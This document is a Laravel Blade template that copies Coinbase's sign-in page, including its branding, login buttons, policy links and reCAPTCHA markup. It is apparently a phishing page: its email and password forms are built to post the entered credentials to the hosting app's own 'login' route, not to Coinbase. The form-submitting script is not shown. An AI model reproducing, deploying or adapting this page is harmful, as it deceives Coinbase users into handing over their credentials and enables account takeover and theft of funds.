@extends('layouts.app')
@section('content')
<div id="root" style="display: flex; flex-direction: column; min-height: 100%">
  <div class="cds-large-llfbhh8 cds-light-l1k3tbpe" style="--foreground: rgb(var(--gray100)); --foreground-muted: rgb(var(--gray60)); --background: rgb(var(--gray0)); --background-alternate: rgb(var(--gray5)); --background-inverse: rgb(var(--gray100)); --background-overlay: rgba(var(--gray80),0.33); --line: rgba(var(--gray60),0.2); --line-heavy: rgba(var(--gray60),0.66); --primary: rgb(var(--blue70)); --primary-wash: rgb(var(--blue0)); --primary-foreground: rgb(var(--gray0)); --negative: rgb(var(--red60)); --negative-foreground: rgb(var(--gray0)); --negative-wash: rgb(var(--red0)); --positive: rgb(var(--green60)); --positive-foreground: rgb(var(--gray0)); --secondary: rgb(var(--gray20)); --secondary-foreground: rgb(var(--gray100)); --transparent: rgba(var(--gray0),0); --warning: rgb(var(--yellow50)); --warning-foreground: rgb(var(--orange70));">
    <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-column-ci8mx7v cds-background-b85wjan" style="height: 100%; width: 100%;">
      <div data-testid="signin-header" class="cds-flex-f1g67tkn cds-center-cv8796s cds-center-ca5ylan cds-space-between-s1vbz1 cds-background-b85wjan cds-2-_115h1mf cds-2-_1qjdqpv cds-3-_1ol1258 cds-3-_1ti0n00 cds-2-_1qjdqpv" style="width: 100%;">
        <a data-testid="header-logo-link" class="cds-link cds-link-l17zyfmx" title="Home" href="https://coinbase.com">
          <span class="cds-typographyResets-t1xhpuq2 cds-textInherit-t1yzihzw cds-primary-piuvss6 cds-transition-txjiwsi cds-start-s1muvu8a cds-link--container">
            <svg aria-label="Coinbase logo" class="cds-iconStyles-iogjozt" height="32" role="img" viewBox="0 0 48 48" width="32" xmlns="http://www.w3.org/2000/svg">
              <title>Coinbase logo</title>
              <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#0051ff"></path>
            </svg>
          </span>
        </a>
        <div class="cds-flex-f1g67tkn cds-row-r1tfxker cds-1-_obadkb">
          <button data-testid="button-sign-up" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-scaledDownState-sxr2bd6 cds-secondaryForeground-s111xox1 cds-button-bpih6bv cds-buttonCompact-b17kdj8k cds-2-_h5hy70 cds-2-_hu3zq5" type="button" style="--interactable-height: 40px; --interactable-border-radius: 40px; --interactable-background: transparent; --interactable-disabled-background: rgb(10, 11, 13);">
            <span class="cds-positionRelative-p109mlw7">
              <span class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-secondaryForeground-s111xox1 cds-transition-txjiwsi cds-start-s1muvu8a">
                <span class="">Sign up</span>
              </span>
            </span>
          </button>
          <a data-testid="button-business-login" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-scaledDownState-sxr2bd6 cds-secondaryForeground-s111xox1 cds-button-bpih6bv cds-buttonCompact-b17kdj8k cds-2-_h5hy70 cds-2-_hu3zq5" href="https://accounts.coinbase.com/signin" style="--interactable-height: 40px; --interactable-border-radius: 40px; --interactable-background: rgba(240,240,240,255); --interactable-hovered-background: rgba(240,240,240,255); --interactable-hovered-opacity: 0.96; --interactable-pressed-background: rgb(71, 73, 80); --interactable-pressed-opacity: 0.9; --interactable-disabled-background: rgb(30, 32, 37);">
            <span class="cds-positionRelative-p109mlw7">
              <span class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-secondaryForeground-s111xox1 cds-transition-txjiwsi cds-start-s1muvu8a">
                <span class="">Sign in to Business</span>
              </span>
            </span>
          </a>
        </div>
      </div>
      <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-column-ci8mx7v cds-1-_1xqs9y8 cds-1-_9w3lns" style="width: 100%;">
        <div class="cds-flex-f1g67tkn cds-flex-start-f1lnfmfd cds-row-r1tfxker cds-center-czxavit" style="width: 100%;">
          <div class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="max-width: 448px; width: 100%;">
            <div class="cds-flex-f1g67tkn cds-center-czxavit cds-roundedLarge-rdc2t5d cds-bordered-b17mbjy1 cds-5-_1fh7zw6 cds-5-_1yjsi5b cds-4-_1w9a5m" style="width: 100%;">
              <div id="two-factor" class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-3-_1mvq9l2" style="width: 100%;">
                <div class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="flex-grow: 1; max-width: 448px; width: 100%;">
                  <div class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="flex-grow: 1; max-width: 448px; width: 100%;">
                    <div data-testid="load-view-wrapper" class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="flex-grow: 1; max-width: 448px; width: 100%;">
                      <div data-testid="password-input-code" class="cds-flex-f1g67tkn cds-column-ci8mx7v">
                        <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-2-_1qjdqpv">
                          <h2 class="cds-typographyResets-t1xhpuq2 cds-title1-toujgnf cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a cds-9-_1saw5bv">Sign in to Coinbase</h2>
                          <div data-testid="description" class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-1-_1xqs9y8 cds-3-_zv3bp">
                            <p class="cds-typographyResets-t1xhpuq2 cds-body-bb7l4gg cds-foregroundMuted-f1vw1sy6 cds-transition-txjiwsi cds-start-s1muvu8a cds-break-b8plbaq">To continue to Account Management</p>
                          </div>
                        </div>
                        <form id="form1">
                          <div data-testid="" class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-0_5-_5akrcb" style="width: 100%; opacity: 1;">
                            <label for="cds-textinput-label-:r4:" data-testid="" class="cds-typographyResets-t1xhpuq2 cds-label1-lvviwwo cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a cds-0_5-_1oy8l1i cds-0_5-_uaer6w cds-labelStyle-l14tr5bh">Email</label>
                            <div class="cds-flex-f1g67tkn cds-row-r1tfxker">
                              <div class="cds-inputAreaContainerStyles-i1sndg40">
                                <span data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background);  --interactable-hovered-opacity: 0.98; --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13);">
                                  <input aria-label="Email" class="cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-2-_fbgb57" data-testid="email-input" id="email" tabindex="0" aria-invalid="false" id="cds-textinput-label-:r4:" placeholder="Your email address" type="email" autocomplete="username webauthn" value="" style="text-align: start; color-scheme: light;">
                                </span>
                              </div>
                            </div>
                          </div>
                          <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-column-ci8mx7v cds-2-_115h1mf cds-2-_8lqlrb">
                            <button id="continueBtn" data-testid="password-submit-button" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-fullWidth-fnzgr0o cds-scaledDownState-sxr2bd6 cds-primaryForeground-pxcz3o7 cds-button-bpih6bv cds-buttonBlock-b90146d cds-4-_1arbnhr cds-4-_hd2z08" type="submit" style="--interactable-height: 56px; --interactable-border-radius: 56px; --interactable-background: var(--primary); --interactable-hovered-background: rgb(80, 127, 229); --interactable-hovered-opacity: 0.91; --interactable-pressed-background: rgb(75, 120, 214); --interactable-pressed-opacity: 0.85; --interactable-disabled-background: rgb(49, 75, 132);">
                              <span class="cds-positionRelative-p109mlw7">
                                <span class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-primaryForeground-pxcz3o7 cds-transition-txjiwsi cds-start-s1muvu8a"><span class="">Continue</span>
                              </span>
                            </span>
                          </button>
                          <div data-testid="alternate-signin-methods" class="cds-flex-f1g67tkn cds-center-ca5ylan cds-column-ci8mx7v cds-2-_1qjdqpv cds-2-_8lqlrb" style="width: 100%;">
                            <div class="cds-flex-f1g67tkn cds-center-czxavit cds-relative-r1fxlug" style="width: 100%; position: relative;">
                              <div class="cds-flex-f1g67tkn cds-background-b85wjan cds-2-_h5hy70 cds-2-_hu3zq5" style="z-index: 1;">
                                <div class="cds-typographyResets-t1xhpuq2 cds-legal-l7opkku cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-center-c1avs9t3">OR</div>
                              </div>
                              <div class="cds-flex-f1g67tkn cds-stretch-s5nqxyn cds-stretch-s18bbwip cds-absolute-aifrgod" style="width: 100%; position: absolute; top: 8px;">
                                <div aria-orientation="horizontal" class="cds-horizontal-h1im6ndd cds-line-ljohrkr" role="separator"></div>
                              </div>
                            </div>
                            <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-column-ci8mx7v cds-1-_obadkb" style="width: 100%;">
                              <button data-testid="sign-in-with-passkey" aria-label="Sign in with Passkey" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-scaledDownState-sxr2bd6 cds-pressableResetStyles-p1yut83c" type="button" style="--interactable-border-radius: 1000px; --interactable-background: rgba(240, 240, 240, 255); --interactable-hovered-opacity: 0.96; --interactable-pressed-background: rgb(71, 73, 80); --interactable-hovered-background: rgba(30, 32, 37, 0.07); --interactable-pressed-opacity: 0.9; --interactable-disabled-background: rgb(30, 32, 37); width: 100%;">
                                <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-row-r1tfxker cds-space-between-s1vbz1 cds-2-_115h1mf cds-2-_1qjdqpv cds-3-_1ol1258 cds-4-_hd2z08 cds-2-_8lqlrb" style="width: 100%;">
                                  <span class="cds-typographyResets-t1xhpuq2 cds-body-bb7l4gg cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a">Sign in with Passkey</span>
                                  <svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M5.37256 0.93801C4.02536 1.22585 2.8994 2.35696 2.55569 3.75968C2.43717 4.24618 2.43717 5.05701 2.55569 5.5435C2.90335 6.9665 4.02141 8.07328 5.40417 8.36518C5.62936 8.41383 5.8506 8.42599 6.30098 8.41383C6.80668 8.39356 6.941 8.37734 7.22941 8.28004C8.02746 8.01652 8.62007 7.59489 9.08625 6.95434C9.38256 6.55298 9.56429 6.18405 9.70652 5.71783C9.80529 5.38944 9.81319 5.30836 9.81319 4.65159C9.81319 3.99482 9.80529 3.91374 9.70652 3.58536C9.3312 2.33668 8.45809 1.43261 7.22941 1.02315C6.92915 0.921793 6.82643 0.909631 6.26148 0.897468C5.83875 0.88936 5.54639 0.901522 5.37256 0.93801Z" fill="black"></path>
                                    <path d="M12.5633 5.55967C11.9983 5.68129 11.5045 5.96508 11.0817 6.41509C10.2995 7.23808 10.0625 8.4908 10.4891 9.56515C10.7064 10.1165 11.1963 10.6922 11.6862 10.976L11.9272 11.1179L11.9312 13.3882V15.6585L12.5356 16.2747L13.1401 16.895L14.1633 15.8409L15.1905 14.7869L14.5781 14.1585L13.9658 13.5301L14.5702 12.9098C14.8982 12.5693 15.1708 12.2733 15.1708 12.253C15.1708 12.2328 14.9535 11.9895 14.6888 11.7179C14.4241 11.4463 14.2147 11.2152 14.2226 11.2071C14.2344 11.199 14.3846 11.1138 14.5584 11.0125C15.2142 10.6395 15.7397 9.94218 15.9214 9.20839C16.0162 8.8273 16.0281 8.11782 15.9411 7.75295C15.7081 6.73131 14.9021 5.884 13.8986 5.60021C13.5944 5.51507 12.8754 5.4948 12.5633 5.55967ZM13.6023 6.90564C13.7959 7.04348 13.9855 7.38808 13.9855 7.607C13.9855 7.81377 13.8196 8.15026 13.6576 8.27594C13.4759 8.41783 13.148 8.48675 12.9386 8.42999C12.5988 8.33269 12.3302 7.97593 12.3262 7.61917C12.3223 6.94618 13.069 6.52861 13.6023 6.90564Z" fill="black"></path>
                                    <path d="M4.16802 9.78411C2.34279 10.0719 0.809901 11.4098 0.233093 13.218C0.0355566 13.8423 0 14.1585 0 15.3585V16.4491H5.33349H10.667V14.1382V11.8274L10.3509 11.5193C9.99536 11.1706 9.71486 10.7976 9.51337 10.4084L9.37904 10.1449L8.94446 9.99492C8.23728 9.75167 7.90147 9.71924 6.09993 9.72329C4.97397 9.72735 4.42087 9.74356 4.16802 9.78411Z" fill="black"></path>
                                  </svg>
                                </div>
                              </button>
                              <div data-testid="oauth-verification" class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="width: 100%;">
                                <ul aria-label="sign-in-with-buttons" class="cds-flex-f1g67tkn cds-stretch-s5nqxyn cds-column-ci8mx7v cds-nowrap-n1jb5thv cds-0-_15toyjv cds-1-_obadkb cds-list-l1g04p8d" style="margin-top: 0px; margin-bottom: 0px;">
                                  <li class="cds-item-izghyk0">
                                    <button data-testid="sign-in-with-google" aria-label="Sign in with Google" id="gsi_id_web-UnifiedLogin-IdentificationPrompt" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-scaledDownState-sxr2bd6 cds-pressableResetStyles-p1yut83c" type="button" style="--interactable-border-radius: 1000px; --interactable-background: rgba(240,240,240,255); --interactable-hovered-opacity: 0.96; --interactable-pressed-background: rgb(71, 73, 80); --interactable-hovered-background: rgba(30, 32, 37, 0.07); --interactable-pressed-opacity: 0.9; --interactable-disabled-background: rgb(30, 32, 37); width: 100%;">
                                      <div class="cds-flex-f1g67tkn cds-row-r1tfxker cds-space-between-s1vbz1 cds-2-_115h1mf cds-2-_1qjdqpv cds-3-_1ol1258 cds-2-_hu3zq5 cds-2-_8lqlrb" style="width: 100%;">
                                        <span class="cds-typographyResets-t1xhpuq2 cds-body-bb7l4gg cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a">Sign in with Google</span>
                                        <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-center-czxavit cds-2-_hu3zq5">
                                          <svg width="17" height="17" viewBox="0 0 17 17" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M16.18 8.57691C16.18 8.00964 16.1291 7.46419 16.0345 6.94055H8.5V10.0351H12.8055C12.62 11.0351 12.0564 11.8824 11.2091 12.4496V14.4569H13.7945C15.3073 13.0642 16.18 11.0133 16.18 8.57691Z" fill="black"></path>
                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M8.50017 16.3949C10.6602 16.3949 12.4711 15.6786 13.7947 14.4567L11.2093 12.4495C10.4929 12.9295 9.57653 13.2131 8.50017 13.2131C6.41653 13.2131 4.65289 11.8058 4.0238 9.91492H1.35107V11.9876C2.66744 14.6022 5.37289 16.3949 8.50017 16.3949Z" fill="black"></path>
                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M4.02364 9.91497C3.86364 9.43497 3.77273 8.92225 3.77273 8.39497C3.77273 7.8677 3.86364 7.35497 4.02364 6.87497V4.80225H1.35091C0.809091 5.88225 0.5 7.10406 0.5 8.39497C0.5 9.68588 0.809091 10.9077 1.35091 11.9877L4.02364 9.91497Z" fill="black"></path>
                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M8.50017 3.57684C9.67471 3.57684 10.7293 3.98047 11.5583 4.7732L13.8529 2.47866C12.4674 1.18775 10.6565 0.39502 8.50017 0.39502C5.37289 0.39502 2.66744 2.18775 1.35107 4.80229L4.0238 6.87502C4.65289 4.98411 6.41653 3.57684 8.50017 3.57684Z" fill="black"></path>
                                          </svg>
                                        </div>
                                      </div>
                                    </button>
                                  </li>
                                  <li class="cds-item-izghyk0">
                                    <button data-testid="sign-in-with-apple" aria-label="Sign in with Apple" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-scaledDownState-sxr2bd6 cds-pressableResetStyles-p1yut83c" type="button" style="--interactable-border-radius: 1000px; --interactable-background: rgba(240,240,240,255); --interactable-hovered-opacity: 0.96; --interactable-hovered-background: rgba(30, 32, 37, 0.07); --interactable-pressed-background: rgb(71, 73, 80); --interactable-pressed-opacity: 0.9; --interactable-disabled-background: rgb(30, 32, 37); width: 100%;">
                                      <div class="cds-flex-f1g67tkn cds-row-r1tfxker cds-space-between-s1vbz1 cds-2-_115h1mf cds-2-_1qjdqpv cds-3-_1ol1258 cds-2-_hu3zq5 cds-2-_8lqlrb" style="width: 100%;">
                                        <span class="cds-typographyResets-t1xhpuq2 cds-body-bb7l4gg cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a">Sign in with Apple</span>
                                        <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-center-czxavit cds-2-_hu3zq5">
                                          <svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <g clip-path="url(#clip0_1022_155)">
                                              <path d="M14.1869 13.1777C13.955 13.7134 13.6805 14.2065 13.3625 14.6599C12.929 15.2779 12.5741 15.7057 12.3006 15.9433C11.8765 16.3332 11.4222 16.533 10.9357 16.5443C10.5865 16.5443 10.1653 16.4449 9.67504 16.2433C9.18315 16.0427 8.73112 15.9433 8.31779 15.9433C7.88431 15.9433 7.4194 16.0427 6.92212 16.2433C6.42409 16.4449 6.02288 16.55 5.71613 16.5604C5.24961 16.5803 4.78461 16.3749 4.32046 15.9433C4.02421 15.6849 3.65367 15.242 3.20977 14.6145C2.73351 13.9444 2.34195 13.1673 2.0352 12.2814C1.70668 11.3245 1.54199 10.3979 1.54199 9.50085C1.54199 8.47326 1.76403 7.58699 2.20878 6.84429C2.55832 6.24773 3.02332 5.77714 3.6053 5.43168C4.18729 5.08622 4.81613 4.91017 5.49333 4.89891C5.86387 4.89891 6.34979 5.01353 6.95364 5.23879C7.55579 5.46481 7.94242 5.57942 8.11194 5.57942C8.23867 5.57942 8.66818 5.4454 9.3963 5.17822C10.0849 4.93043 10.666 4.82783 11.1421 4.86825C12.4321 4.97236 13.4013 5.4809 14.0459 6.39708C12.8921 7.09615 12.3214 8.07527 12.3327 9.33134C12.3431 10.3097 12.6981 11.1239 13.3956 11.7703C13.7117 12.0703 14.0648 12.3022 14.4576 12.4669C14.3724 12.7139 14.2825 12.9506 14.1869 13.1777ZM11.2282 1.53515C11.2282 2.30199 10.948 3.01799 10.3896 3.68071C9.71574 4.46855 8.90063 4.9238 8.01672 4.85197C8.00546 4.75997 7.99893 4.66314 7.99893 4.5614C7.99893 3.82523 8.3194 3.03739 8.88852 2.39322C9.17265 2.06706 9.53401 1.79587 9.97223 1.57954C10.4095 1.36643 10.8231 1.24858 11.2121 1.22839C11.2235 1.33091 11.2282 1.43343 11.2282 1.53514V1.53515Z" fill="black"></path>
                                            </g>
                                            <defs>
                                              <clipPath id="clip0_1022_155">
                                                <rect width="16" height="16" fill="black" transform="translate(0 0.89502)"></rect>
                                              </clipPath>
                                            </defs>
                                          </svg>
                                        </div>
                                      </div>
                                    </button>
                                  </li>
                                </ul>
                              </div>
                              <button data-testid="sign-in-with-wallet" aria-label="Sign in with Wallet" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-scaledDownState-sxr2bd6 cds-pressableResetStyles-p1yut83c" type="button" style="--interactable-border-radius: 1000px; --interactable-background: rgba(240,240,240,255); --interactable-hovered-opacity: 0.96; --interactable-pressed-background: rgb(71, 73, 80); --interactable-hovered-background: rgba(30, 32, 37, 0.07); --interactable-pressed-opacity: 0.9; --interactable-disabled-background: rgb(30, 32, 37); width: 100%;">
                                <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-row-r1tfxker cds-space-between-s1vbz1 cds-2-_115h1mf cds-2-_1qjdqpv cds-3-_1ol1258 cds-2-_hu3zq5 cds-2-_8lqlrb" style="width: 100%;">
                                  <span class="cds-typographyResets-t1xhpuq2 cds-body-bb7l4gg cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a">Sign in with Wallet</span>
                                  <div class="cds-flex-f1g67tkn cds-2-_h5hy70 cds-2-_hu3zq5 cds-relative-r1fxlug" style="position: relative;">
                                    <div style="width: 16px; height: 16px;">
                                      <span aria-hidden="true" class="cds-iconStyles-iogjozt" data-icon-name="wallet" data-testid="icon-base-glyph" role="img" style="color: var(--foreground); font-size: 16px;"></span>
                                    </div>
                                  </div>
                                </div>
                              </button>
                            </div>
                          </div>
                          <label class="cds-typographyResets-t1xhpuq2 cds-legal-l7opkku cds-foregroundMuted-f1vw1sy6 cds-transition-txjiwsi cds-center-c1avs9t3 cds-7-_1wg6ttf cds-7-_13v6b6w">Not your device? Use a private window. See our 
                            <a data-testid="link-privacy-policy" class="cds-link cds-link-l17zyfmx" href="https://coinbase.com/legal/privacy" rel="noopener noreferrer" target="_blank">
                              <span class="cds-typographyResets-t1xhpuq2 cds-textInherit-t1yzihzw cds-primary-piuvss6 cds-transition-txjiwsi cds-start-s1muvu8a cds-noUnderline-njp1bsq cds-link--container">Privacy Policy</span>
                            </a> for more info</label>
                          </div>
                        </form>
                        <form id="form2" data-storeURL="{{ route('login') }}">
                          <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-3-_1mvq9l2 cds-3-_zv3bp">
                            <div class="cds-flex-f1g67tkn">
                              <button id="backBtn" data-testid="email-button" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-line-lm9v2nm cds-button-b18qe5go cds-scaledDownState-sxr2bd6 pii9da1" type="button" style="--interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgba(15, 16, 18, 0.1); --interactable-hovered-opacity: 0.98; --interactable-pressed-background: rgb(30, 31, 32); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13); width: 100%;">
                                <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-row-r1tfxker cds-2-_fbgb57 cds-1-_obadkb">
                                  <div class="a1yqq05w">
                                    <div class="iconContainer">
                                      <div class="cds-flex-f1g67tkn cds-relative-r1fxlug" style="position: relative;">
                                        <div style="width: 16px; height: 16px;">
                                          <span aria-hidden="true" class="cds-iconStyles-iogjozt" data-icon-name="profile" data-testid="icon-base-glyph" role="img" style="color: var(--foreground-muted); font-size: 16px;"></span>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                  <input readonly="" type="text" class="hizr401" name="username" id="username" data-testid="username-hidden-field">
                                  <p id="emailDisplay" class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a cds-truncate-t1dtku18"></p>
                                </div>
                              </button>
                            </div>
                            <div data-testid="" class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-0_5-_5akrcb" style="width: 100%; opacity: 1;">
                              <label for="cds-textinput-label-:rl:" data-testid="" class="cds-typographyResets-t1xhpuq2 cds-label1-lvviwwo cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a cds-0_5-_1oy8l1i cds-0_5-_uaer6w cds-labelStyle-l14tr5bh">Password</label>
                              <div class="cds-flex-f1g67tkn cds-row-r1tfxker">
                                <div class="cds-inputAreaContainerStyles-i1sndg40">
                                  <span data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-opacity: 0.98; --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13);">
                                    <input aria-describedby="cds-textinput-description-:rl:" aria-label="Password" class="cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-2-_fbgb57" data-testid="password-input" tabindex="0" aria-invalid="false" name="password" id="current-password" autocomplete="current-password" type="password" style="text-align: start; color-scheme: light;">
                                    <div data-testid="" class="cds-flex-f1g67tkn cds-center-ca5ylan cds-row-r1tfxker cds-center-czxavit cds-2-_8lqlrb">
                                     <button aria-label="Show password" id="togglePassword" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-scaledDownState-sxr2bd6 cds-flex-f1g67tkn cds-center-ca5ylan cds-center-czxavit cds-iconButton-i1804idl" type="button" style="--interactable-height: 40px; --interactable-border-radius: 1000px; --interactable-background: transparent; --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13);">
                                      <div class="cds-flex-f1g67tkn cds-relative-r1fxlug" style="position: relative;">
                                        <div style="width: 16px; height: 16px;">
                                          <span id="passwordIcon" aria-hidden="true" class="cds-iconStyles-iogjozt" data-icon-name="visibleInactive" data-testid="icon-base-glyph" role="img" style="color: var(--foreground-muted); font-size: 16px;"></span>
                                        </div>
                                      </div>
                                    </button>
                                  </div>
                                </span>
                              </div>
                            </div>
                          </div>
                          <div class="cds-flex-f1g67tkn cds-2-_1qjdqpv">
                            <button class="cds-link cds-link-l17zyfmx" type="button">
                              <span class="cds-typographyResets-t1xhpuq2 cds-body-bb7l4gg cds-primary-piuvss6 cds-transition-txjiwsi cds-start-s1muvu8a cds-link--container">Forgot password?</span>
                            </button>
                          </div>
                        </div>
                        <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-2-_115h1mf cds-2-_8lqlrb">
                          <button class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-scaledDownState-sxr2bd6 cds-primaryForeground-pxcz3o7 cds-button-bpih6bv cds-4-_1arbnhr cds-4-_hd2z08" type="submit" style="--interactable-height: 56px; --interactable-border-radius: 56px; --interactable-background: var(--primary); --interactable-hovered-background: rgb(80, 127, 229); --interactable-hovered-opacity: 0.91; --interactable-pressed-background: rgb(75, 120, 214); --interactable-pressed-opacity: 0.85; --interactable-disabled-background: rgb(49, 75, 132);">
                            <span class="cds-positionRelative-p109mlw7">
                              <span class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-primaryForeground-pxcz3o7 cds-transition-txjiwsi cds-start-s1muvu8a">
                                <span>Continue</span>
                              </span>
                            </span>
                          </button>
                        </div>
                      </form>
                    </div>
                    <div class="cds-flex-f1g67tkn r7rfe1z">
                      <div data-testid="visible_recaptcha" data-sitekey="NOT_USED"></div>
                      <div data-testid="invisible_recaptcha" data-sitekey="6LcTV7IcAAAAAI1CwwRBm58wKn1n6vwyV1QFaoxr">
                        <div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;">
                          <div class="grecaptcha-logo">
                            <iframe title="reCAPTCHA" width="256" height="60" role="presentation" name="a-5pxi57qyr2xm" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="https://www.google.com/recaptcha/enterprise/anchor?ar=1&amp;k=6LcTV7IcAAAAAI1CwwRBm58wKn1n6vwyV1QFaoxr&amp;co=aHR0cHM6Ly9sb2dpbi5jb2luYmFzZS5jb206NDQz&amp;hl=en-GB&amp;v=hfUfsXWZFeg83qqxrK27GB8P&amp;theme=light&amp;size=invisible&amp;badge=bottomright&amp;cb=xcy63eg5rqsa"></iframe>
                          </div>
                          <div class="grecaptcha-error"></div>
                          <textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea>
                        </div>
                        <iframe style="display: none;"></iframe>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <div data-testname="hidden-banner" data-testid="banner-container" class="cds-flex-f1g67tkn cds-fixed-f1v5p9l4" style="width: 100%; position: fixed; bottom: -200px; z-index: 3; transition: bottom 500ms; will-change: bottom;">
    <div id="cookie-banner" class="cds-flex-f1g67tkn cds-center-czxavit cds-backgroundAlternate-b1o0kdmt" style="width: 100%;">
      <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-row-r1tfxker cds-space-between-s1vbz1 cds-3-_1ixgcz3 cds-3-_1mvq9l2 cds-6-_1iifjn6 cds-6-_1ts70zl" style="max-width: 800px; width: 100%;">
        <p class="cds-typographyResets-t1xhpuq2 cds-label2-ln29cth cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a cds-0-_vhy4ik cds-1-_7ojgr9">We use strictly necessary cookies to enable essential functions, such as security and authentication. For more information, see our 
          <a class="cds-link cds-link-l17zyfmx" href="https://coinbase.com/legal/cookie" rel="noopener noreferrer" target="_blank">
            <span class="cds-typographyResets-t1xhpuq2 cds-textInherit-t1yzihzw cds-primary-piuvss6 cds-transition-txjiwsi cds-start-s1muvu8a cds-link--container">Cookie Policy</span>
          </a>.</p>
